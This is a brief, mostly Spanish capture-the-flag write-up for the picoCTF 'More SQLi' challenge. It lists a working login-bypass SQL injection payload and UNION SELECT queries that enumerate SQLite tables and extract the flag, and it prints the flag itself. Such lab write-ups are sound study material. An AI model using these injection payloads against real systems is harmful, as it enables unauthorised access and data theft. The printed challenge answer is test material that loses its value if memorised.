### More SQLi

Can you find the flag on this website. Try to find the flag [here](http://saturn.picoctf.net:59233/).
### Solución 

Se pone en la password admin' or 1 = 1; y en usuario cualquier cosa y se pudo acceder.
En el buscador se pone hola' union select 1,name,3 from sqlite_master where type = 'table'--

Luego hola' union select 1,sql,3 from sqlite_master where type = 'table'-- para ver las tablas de la base de datos y finalmente hola' union select 1,flag,3 from more_table -- para buscar la bandera

|     |                                                         |
| --- | ------------------------------------------------------- |
|     | picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37} |
### Notas
Se realizaron consultas SQL para ir buscando las bases y las tablas donde se encontraria la bandera.


